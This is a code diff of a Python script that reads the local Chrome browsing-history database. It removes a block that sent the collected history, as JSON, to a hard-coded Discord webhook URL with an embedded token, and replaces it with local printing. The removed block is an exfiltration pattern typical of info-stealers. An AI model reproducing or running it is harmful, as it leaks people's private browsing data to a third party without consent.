@@ -1,8 +1,6 @@
 import sqlite3
 import os
 import datetime
-import json
-import requests
 
 # Get the path to the user's Chrome history database
 data_path = os.path.expanduser('~') + "/Library/Application Support/Google/Chrome/Default"
@@ -18,23 +16,14 @@ select_statement = "SELECT urls.url, urls.title, visits.visit_time FROM urls, vi
 cursor.execute(select_statement)
 results = cursor.fetchall()
 
-# Create a list of dictionaries representing each history item
-history_items = []
+# Print out the results
+print("Chrome History:\n")
 for row in results:
     url = row[0]
     title = row[1]
     timestamp = row[2] / 1000000
     visit_time = datetime.datetime.fromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M:%S")
-    history_items.append({"url": url, "title": title, "visit_time": visit_time})
+    print(f"{visit_time}: {title} ({url})")
 
 # Close the database connection
 connection.close()
-
-# Send the history data to a Discord webhook
-webhook_url = "https://discord.com/api/webhooks/1089245450760097995/1sH24u4b4epfXkh3goi45cH4CFOhoz6bvkHROD5y75gcHYkmg3madp9FcQyY7FHGEhHx"
-payload = {"content": "Chrome History:\n" + json.dumps(history_items, indent=4)}
-response = requests.post(webhook_url, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
-if response.status_code == 204:
-    print("History data sent to Discord webhook successfully.")
-else:
-    print(f"Failed to send history data to Discord webhook. Response code: {response.status_code}")
